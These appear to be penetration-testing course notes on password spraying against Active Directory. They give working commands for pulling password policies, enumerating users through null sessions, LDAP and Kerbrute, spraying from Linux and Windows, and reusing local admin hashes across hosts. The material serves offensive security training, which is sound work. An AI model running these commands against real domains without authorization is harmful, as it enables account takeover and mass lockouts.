# Password Spraying

In this section will cover:
- Password Spraying Overview
- Enumerating & Retrieving Password Policies
- Password Spraying - Make a Target User List
- Internal Password Spraying - from Linux
- Internal Password Spraying - from Windows

## Password Spraying Overview

The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying.

- https://github.com/insidetrust/statistically-likely-usernames
- https://github.com/initstring/linkedin2username

**Password Spraying Considerations**

While password spraying is useful for a penetration tester or red teamer, careless use may cause considerable harm, such as locking out hundreds of production accounts. One example is brute-forcing attempts to identify the password for an account using a long list of passwords. In contrast, password spraying is a more measured attack, utilizing very common passwords across multiple industries. The below table visualizes a password spray.

| Attack | Username                         | Password   |
| ------ | -------------------------------- | ---------- |
| 1      | bob.smith@inlanefreight.local    | Welcome1   |
| 1      | john.doe@inlanefreight.local     | Welcome1   |
| 1      | jane.doe@inlanefreight.local     | Welcome1   |
| DELAY  |                                  |            |
| 2      | bob.smith@inlanefreight.local    | Passw0rd   |
| 2      | john.doe@inlanefreight.local     | Passw0rd   |
| 2      | jane.doe@inlanefreight.local     | Passw0rd   |
| DELAY  |                                  |            |
| 3      | bob.smith@inlanefreight.local    | Winter2022 |
| 3      | john.doe@inlanefreight.local     | Winter2022 |
| 3      | jane.doe@inlanefreight.local     | Winter2022 |

## Enumerating & Retrieving Password Policies

### Enumerating the Password Policy - from Linux - Credentialed

We can pull the domain password policy in several ways, depending on how the domain is configured and whether or not we have valid domain credentials. With valid domain credentials, the password policy can also be obtained remotely using tools such as netexec or rpcclient.
````bash
$ nxc smb <IP_DC> -u <user> -p <password> --pass-pol
````

### Enumerating the Password Policy - from Linux - SMB NULL Sessions

Without credentials, we may be able to obtain the password policy via an SMB NULL session or LDAP anonymous bind. The first is via an SMB NULL session. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.

An SMB NULL session can be enumerated easily. For enumeration, we can use tools such as enum4linux, netexec, rpcclient, etc.

**Using rpcclient**
````bash
# Login with Null Session
$ rpcclient -U "" -N <DC_IP>

# Obtaining the Password Policy using rpcclient
$> querydominfo
````
**Using enum4linux**
````bash
$ enum4linux -P <DC_IP>
````

### Enumerating Null Session - from Windows

It is less common to do this type of null session attack from Windows, but we could use the command net use \\host\ipc$ "" /u:"" to establish a null session from a windows machine and confirm if we can perform more of this type of attack.

````cmd
# Establish a null session from windows
> net use \\DC01\ipc$ "" /u:""

# Error: Account is Disabled
> net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.
This user can't sign in because this account is currently disabled.

# Error: Password is Incorrect
> net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.
The user name or password is incorrect.

# Error: Account is locked out (Password Policy)
> net use \\DC01\ipc$ "password" /u:guest
System error 1909 has occurred.
The referenced account is currently locked out and may not be logged on to.
````

### Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. 

With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as windapsearch.py, ldapsearch, ad-ldapdomaindump.py, etc., to pull the password policy. With ldapsearch, it can be a bit cumbersome but doable.

**Using ldapsearch**
````bash
$ ldapsearch -h <DC_IP> -x -b "DC=<Domain>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
````

### Enumerating the Password Policy - from Windows

If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as net.exe to retrieve the password policy. We can also use various tools such as PowerView, SharpMapExec, SharpView, etc.

**Using net.exe**
````cmd
> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
````
Here we can glean the following information:
- Passwords never expire (Maximum password age set to Unlimited)
- The minimum password length is 8 so weak passwords are likely in use
- The lockout threshold is 5 wrong passwords
- Accounts remained locked out for 30 minutes

This password policy is excellent for password spraying. The eight-character minimum means that we can try common weak passwords such as **Welcome1**.

**Using PowerView**
````powershell
> import-module .\PowerView.ps1
> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
````

**Analyzing the Password Policy**

We've now pulled the password policy in numerous ways. Let's go through the policy for the "domain" domain piece by piece.
- The minimum password length is 8 (8 is very common, but nowadays, we are seeing more and more organizations enforce a 10-14 character password, which can remove some password options for us, but does not mitigate the password spraying vector completely)
- The account lockout threshold is 5 (it is not uncommon to see a lower threshold such as 3 or even no lockout threshold set at all)
- The lockout duration is 30 minutes (this may be higher or lower depending on the organization), so if we do accidentally lockout (avoid!!) an account, it will unlock after the 30-minute window passes
- Accounts unlock automatically (in some organizations, an admin must manually unlock the account). We never want to lockout accounts while performing password spraying, but we especially want to avoid locking out accounts in an organization where an admin would have to intervene and unlock hundreds (or thousands) of accounts by hand/script
- Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character (**Password1** or **Welcome1** would satisfy the "complexity" requirement here, but are still clearly weak passwords).

## Password Spraying - Making a Target User List

To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a target list of valid users:
- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist

### SMB NULL Session to Pull User List

**Using enum4linux**
````bash
$ enum4linux -U <DC_IP>  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
````
**Using rpcclient**
````bash
# Login with Null Session
$ rpcclient -U "" -N 172.16.5.5

# Retrieve users
$> enumdomusers
````
**Using Netexec --users Flag**
````bash
$ nxc smb <DC_IP> --users
$ nxc smb <DC_IP> -u '' -p '' --users
$ nxc smb <DC_IP> -u '' -p '' --rid-brute

# Valid Credentials
$ sudo crackmapexec smb <DC_IP> -u <user> -p <password> --users
````

### Gathering Users with LDAP Anonymous

**Using ldapsearch**
````bash
$ ldapsearch -h <DC_IP> -x -b "DC=<domain>,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
````
**Using windapsearch**
````bash
$ ./windapsearch.py --dc-ip <DC_IP> -u "" -U
````

### Enumerating Users with Kerbrute

This tool uses Kerberos Pre-Authentication, which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error PRINCIPAL UNKNOWN, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. 

````bash
$  kerbrute userenum -d <domain> --dc <DC_IP> /opt/jsmith.txt
````

## Internal Password Spraying - from Linux

Once we’ve created a wordlist using one of the methods shown in the previous section, it’s time to execute the attack. 

Rpcclient is an excellent option for performing this attack from Linux. 

**Using a Bash one-liner for the Attack**
````bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC_IP> | grep Authority; done
````
**Using Kerbrute for the Attack**
````bash
$ kerbrute passwordspray -d <domain> --dc <DC_IP> valid_users.txt  Welcome1
````
**Using Netexec**
````bash
$ sudo nxc smb <DC_IP> -u valid_users.txt -p Password123 | grep +
$ sudo nxc smb <DC_IP> -u valid_users.txt -p Password123 --continue-on-success | grep +
````

### Local Administrator Password Reuse

Internal password spraying is not only possible with domain user accounts. If you obtain administrative access and the NTLM password hash or cleartext password for the local administrator account (or another privileged local account), this can be attempted across multiple hosts in the network. Local administrator account password reuse is widespread due to the use of gold images in automated deployments and the perceived ease of management by enforcing the same password across multiple hosts.

In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.
````bash
$ sudo nxc smb --local-auth <Network> -u administrator -H <hash_ntlm> | grep +
````

## Internal Password Spraying - from Windows

From a foothold on a domain-joined Windows host, the DomainPasswordSpray tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. There are several options available to us with the tool. Since the host is domain-joined, we will skip the -UserList flag and let the tool generate a list for us. We'll supply the Password flag and one single password and then use the -OutFile flag to write our output to a file for later use.

**Using DomainPasswordSpray.ps1**
````powershell
> Import-Module .\DomainPasswordSpray.ps1
> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
````

## External Password Spraying

Password spraying is also a common way that attackers use to attempt to gain a foothold on the internet. We have been very successful with this method during penetration tests to gain access to sensitive data through email inboxes or web applications such as externally facing intranet sites. Some common targets include:
- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication
